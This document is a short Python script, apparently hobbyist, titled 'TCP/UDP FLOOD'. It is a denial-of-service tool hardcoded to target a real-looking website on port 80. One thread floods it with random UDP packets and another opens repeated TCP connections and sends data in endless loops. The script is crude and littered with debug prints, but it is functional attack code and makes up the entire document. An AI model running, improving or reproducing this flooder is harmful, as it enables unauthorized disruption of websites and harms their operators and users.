#!/usr/bin/env python3
#Code by LeeOn123
import random
import socket
import threading

print("--> C0de By Lee0n123 <--")
print("#-- TCP/UDP FLOOD --#")
ip = "www.bsnajia.com"
port = 80
choice = "n"
times = 100000000000000000000000000
threads = 1
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip), int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except :
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			print("passed 1")
			print (s)
			print("www.bsnaija.com", 80)
			s.connect(("www.bsnaija.com", 80))
			print("passed 2")
			s.send(data)
			print("passed 3")
			for x in range(times):
				print("passed 4")
				s.send(data)
				print("passed 5")
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()